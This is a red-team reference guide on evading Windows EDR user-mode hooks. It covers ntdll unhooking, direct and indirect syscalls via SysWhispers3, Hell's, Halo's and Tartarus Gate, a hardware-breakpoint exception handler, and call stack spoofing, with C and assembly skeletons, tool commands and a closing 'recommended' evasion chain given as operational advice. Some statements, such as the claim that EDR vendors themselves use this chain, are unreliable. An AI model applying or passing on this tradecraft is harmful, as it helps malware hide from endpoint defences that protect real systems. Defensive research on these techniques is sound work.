# Unhook / direct / indirect syscall technology list

> Only for authorized red team/confrontational exercises/own product testing, prohibited for use on unauthorized targets.

This document summarizes the current mainstream "bypassing user-mode hook" technologies, from the most classic unhook to the latest hardware breakpoint Blindside.
All technologies are compliant with MITER ATT&CK T1562.001 / T1027 / T1055 for easy report output.

## 1. Peruns Fart / Fresh Ntdll from disk

### principle

All EDR hooks are located in ntdll.dll in the current process memory. `C:\Windows\System32\ntdll.dll` is clean on the disk.
So as long as the disk ntdll is remapped into the current process and the `.text` section in memory is overwritten, the hook is erased.

```text
Current process ntdll.dll (RWX)
  ┌─────────────────────────┐
  │ .text (including EDR hook jmp) │ ◄── Overwrite with disk clean .text
  └─────────────────────────┘
        ▲
        │ NtMapViewOfSection(disk_ntdll)
        │
Disk C:\Windows\System32\ntdll.dll ← clean
```

### Implementation points

```c
// step:
// 1. CreateFileW("\\Device\\HarddiskVolumeX\\Windows\\System32\\ntdll.dll") // Use native path to bypass monitoring
// 2. NtCreateSection (SEC_IMAGE)
// 3. NtMapViewOfSection to a new address
// 4. Find the new address .text section
// 5. NtProtectVirtualMemory changes the current ntdll .text to RW
// 6. memcpy coverage
// 7. NtProtectVirtualMemory restored to RX
```

### Notice

- `NtProtectVirtualMemory` itself may be a hook → chain problem. Solution: First use **direct syscall** to call `NtProtectVirtualMemory`
- Modern EDR already monitors `NtProtectVirtualMemory` for W operations on ntdll memory, and needs to cooperate with ETW patch
- Peruns Fart will leave events `KERNEL_MODULE_LOAD` and `PROTECTVM` under ETW-TI - be sure to press ETW first

## 2. Direct Syscall (Direct Syscall)

### principle

Instead of calling the exported functions of ntdll, write the syscall stub yourself:

```asm
NtAllocateVirtualMemory:
    mov r10, rcx
    mov eax, 0x18 ; SSN (value on Win11 24H2, different for each version)
    syscall
    ret
```

The `syscall` instruction jumps directly from user mode to kernel SSDT, skipping any user mode hooks.

### SysWhispers3 usage

```powershell
git clone https://github.com/klezVirus/SysWhispers3
cd SysWhispers3
python3 syswhispers.py --preset all --action edit -o syscalls
```

Output:

```text
syscalls.h - function declaration
syscalls.c - C glue code
syscalls.asm - MASM assembly stub
syscallsstubs.std.x64.asm - standard direct syscall
```

In Visual Studio:

```text
1. Add .asm to the project and enable MASM (Custom Build Tool)
2. include syscalls.h
3. Call Sw3NtAllocateVirtualMemory(...) to replace the original NtAllocateVirtualMemory
```

### Minimal direct syscall to NtCreateFile (C code skeleton)

```c
// syscalls.asm (excerpt)
// Sw3NtCreateFile PROC
//     mov [rsp +8], rcx
//     mov [rsp+16], rdx
//     mov [rsp+24], r8
//     mov [rsp+32], r9
//     sub rsp, 28h
//     mov ecx, 0x55; function hash (dynamic analysis of SSN)
//     call Sw3GetSyscallNumber
//     add rsp, 28h
//     mov rcx, [rsp+8]
//     mov rdx, [rsp+16]
//     mov r8,  [rsp+24]
//     mov r9,  [rsp+32]
//     mov r10, rcx
//     syscall
//     ret
// Sw3NtCreateFile ENDP

#include <windows.h>
#include "syscalls.h"

int main(void) {
    HANDLE hFile = NULL;
    OBJECT_ATTRIBUTES oa;
    UNICODE_STRING uName;
    IO_STATUS_BLOCK iosb;
    WCHAR path[] = L"\\??\\C:\\Windows\\Temp\\edr_test.bin";

    uName.Buffer = path;
    uName.Length = (USHORT)(wcslen(path) * sizeof(WCHAR));
    uName.MaximumLength = uName.Length + sizeof(WCHAR);

    InitializeObjectAttributes(&oa, &uName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    NTSTATUS st = Sw3NtCreateFile(
        &hFile,
        FILE_GENERIC_WRITE,
        &oa,
        &iosb,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OVERWRITE_IF,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );

    if (st >= 0) {
        // write some bytes
        Sw3NtClose(hFile);
        return 0;
    }
    return (int)st;
}
```

### shortcoming

- The syscall instruction is located in the implant's own `.text` section (not within ntdll) → kernel-mode telemetry can easily see "syscall from non-ntdll address"
- That's why indirect syscall comes in

## 3. Indirect Syscall (Indirect Syscall)

### principle

The syscall instruction still comes from ntdll.dll (legal address), but we control the SSN and return address ourselves:

```text
implant code:
    mov r10, rcx
    mov eax, <SSN>
jmp [<The address of a syscall; ret gadget in ntdll>] ; not syscall in implant
```

The gadget that jumps to is usually the `syscall; ret` two-byte sequence at the end of the `Nt*` function.
The RIP seen by the kernel-mode ETW provider is the ntdll address, which conforms to the legal behavior pattern.

### SysWhispers3 indirect mode

```powershell
python3 syswhispers.py --preset all --action edit --mode jumper -o syscalls
# --mode jumper            => indirect syscall
# --mode jumper_randomized => Randomize jmp target reduction signature
```

Generated stub:

```asm
Sw3NtAllocateVirtualMemory PROC
    mov [rsp+8], rcx
    ...
    mov ecx, 0x18                  ; function hash
call Sw3GetSyscallNumber ; Return SSN -> eax
call Sw3GetSyscallAddress ; Return ntdll in syscall;ret address -> rbx
    ...
    mov r10, rcx
    jmp rbx ; Jump to the legal syscall instruction in ntdll
Sw3NtAllocateVirtualMemory ENDP
```

## 4. Hell's Gate / Halo's Gate / Tartarus Gate

The three solve the evolution of "SSN dynamic analysis".

### Hell's Gate

- Assume ntdll is not hooked
- Traverse the `Nt*` export of ntdll at implant startup and extract the SSN from the first 4 bytes `mov eax, <SSN>`
- Advantages: No hard-coding of SSN, universal across Windows versions
- Disadvantages: If ntdll has been hooked (the first byte becomes jmp), the extraction fails

### Halo's Gate

- Fixed Hell's Gate hook problem
- If a function is found to be hooked (not a standard prologue), scan ±N functions up/down**
- Taking advantage of the fact that the SSN of the `Nt*` function in ntdll is continuously increasing, the SSN of the hooked function is deduced from the neighbor

```text
Normal situation:
  NtAllocateVirtualMemory  SSN = 0x18
  NtQueryInformationProcess SSN = 0x19
  NtProtectVirtualMemory    SSN = 0x50

If NtAllocateVirtualMemory is hooked and cannot see the SSN, look at the neighbor:
Previous export of not hook SSN = 0x17
Next export of hook SSN = 0x19
  → NtAllocateVirtualMemory SSN = 0x18
```

### Tartarus Gate

- Further processing **Hook changes the SSN but retains the advanced hook of the syscall instruction**
- Verify SSN and syscall;ret gadget address at the same time
- The combination of the three provides the most stable indirect syscall foundation

### Reference implementation location (after bootstrapped git clone)

```text
Hell's Gate:    am0nsec/HellsGate
Halo's Gate: am0nsec/HellsGate (with fallback logic) / SafeBreach-Labs/HalosGate-PoC
Tartarus Gate:  trickster0/TartarusGate
SysWhispers3: Integrates all three
```

## 5. Hardware Breakpoint Blindside

### principle

Use debug registers `DR0-DR3` to set hardware breakpoints at the entrance of EDR hook trampoline;
Set the VEH (Vectored Exception Handler) to change the RIP directly to behind the hook trampoline when the breakpoint is hit,
Skip the EDR detection code and fall to the real syscall section of ntdll.

### Advantages

- No need to write ntdll memory (no `NtProtectVirtualMemory` warning)
- No need to unhook (the hook is still there, just bypassed)
- ETW-TI cannot see memory modifications

### Implement skeleton

```c
// 1. AddVectoredExceptionHandler
// 2. Set DR0..DR3 at the entrance of each hooked function (up to 4, with single-step rotate)
// 3. SetThreadContext(thread, &ctx) writes DRx
// 4. When EDR hook trampoline triggers hardware breakpoint -> VEH takes over
// 5. VEH changes EXCEPTION_POINTERS->ContextRecord->Rip to the legal syscall;ret of ntdll
// 6. ContinueExecution

LONG CALLBACK Blindside(EXCEPTION_POINTERS* ep) {
    if (ep->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        DWORD64 rip = ep->ContextRecord->Rip;
        if (rip == g_hookedNtAllocVM) {
            // SSN is already in eax; R10 = RCX; jump to ntdll's syscall; ret
            ep->ContextRecord->Rip = (DWORD64)g_syscallGadget;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}
```

### limit

- Independent DRx for each thread → Multi-threads must be set separately
- Some EDRs have hooked `NtSetContextThread` / `NtGetContextThread`, you need to use the previous technology to bypass it first
- Win11 22H2+ introduces HVCI / some anti-debugging mitigations may interfere

## 6. Call Stack Spoofing

### question

Modern EDR will call `RtlCaptureStackBackTrace` at the syscall kernel entry such as `NtAllocateVirtualMemory` / `NtCreateThreadEx`, etc.
Get the complete call stack report. **non-image-backed memory** frames → high-confidence alarms will appear on the implant stack.

### Option A: CallStackSpoofer (William Burgess)

Implementation ideas:

1. swap current thread stack before syscall → a fake legal stack
2. The fake stack frame is filled with a fully legal return chain such as `kernel32!BaseThreadInitThunk → ntdll!RtlUserThreadStart`
3. After syscall returns, swap back to the real stack

### Option B: SilentMoonwalk

More radically, use desynchronized stack:

```text
Execution process:
  implant code → custom trampoline (modify RSP / RBP / stack content)
                ↓
                syscall (RtlCaptureStackBackTrace sees fake stack)
                ↓
                trampoline restore → continue implant code
```

The key is unwinding: letting `RtlVirtualUnwind` go into the fake `RUNTIME_FUNCTION` / `UNWIND_INFO` chain.

### Practical OPSEC recommendations

- call stack spoof + indirect syscall + ETW patch is a relatively stable combination currently used by CrowdStrike / SentinelOne
- Spoof is also required during the sleep stage. Spoof is not enough during simple execution (EDR will sample regularly)

## 7. Technology selection comparison table

| Technology | Countermeasures | Complexity | Current Effectiveness | ATT&CK |
|------|------|--------|------------|--------|
| Peruns Fart | Userland hook | Low | Medium (easy to be caught by ETW) | T1562.001 |
| Direct syscall (SysWhispers) | User mode hook | Low | Low-medium (kernel sees RIP in implant) | T1106 / T1562.001 |
| Indirect syscall (jumper) | User mode hook + kernel RIP detection | Medium | Medium-High | T1106 |
| Hell's / Halo's / Tartarus | SSN Resolution | Medium | High (Infrastructure) | T1027 |
| HWBP Blindside | hook + no write | High | High | T1562.001 |
| CallStackSpoofer / SilentMoonwalk | call stack telemetry | high | high | T1564 |

Actual recommended chain: **Halo's Gate + indirect syscall + CallStackSpoofer + ETW patch**.

## References

- SysWhispers3：<https://github.com/klezVirus/SysWhispers3>
- Hell's Gate / Halo's Gate POC：<https://github.com/am0nsec/HellsGate>、<https://github.com/SafeBreach-Labs/HalosGate-PoC>
- Tartarus Gate：<https://github.com/trickster0/TartarusGate>
- CallStackSpoofer：<https://github.com/WithSecureLabs/CallStackSpoofer>
- SilentMoonwalk：<https://github.com/klezVirus/SilentMoonwalk>
- Blindside（hardware breakpoint）：<https://www.cyberark.com/resources/threat-research-blog/blindside-a-new-technique-for-edr-evasion-with-hardware-breakpoints>
- MITRE T1562.001：<https://attack.mitre.org/techniques/T1562/001/>

## Route callback

unhook is only half of bypassing, the other half is telemetry blinding: go into `references/telemetry-blinding.md`.
